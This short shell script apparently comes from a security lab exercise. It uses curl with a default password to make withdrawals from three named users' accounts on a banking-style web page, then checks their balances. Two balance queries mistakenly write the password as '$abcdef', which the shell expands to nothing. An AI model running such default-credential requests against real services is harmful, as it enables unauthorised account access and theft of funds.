#!/bin/sh

#Try to alter account of three default user with default password

curl -o - "http://server/process.php?user=jelena&pass=abcdef&amount=10&drop=withdraw"
curl -o - "http://server/process.php?user=kate&pass=abcdef&amount=10&drop=withdraw"
curl -o - "http://server/process.php?user=john&pass=abcdef&amount=10&drop=withdraw"


curl -sS "10.1.5.2/process.php?user=jelena&pass=abcdef&drop=balance"
curl -sS "10.1.5.2/process.php?user=kate&pass=$abcdef&drop=balance"
curl -sS "10.1.5.2/process.php?user=john&pass=$abcdef&drop=balance"
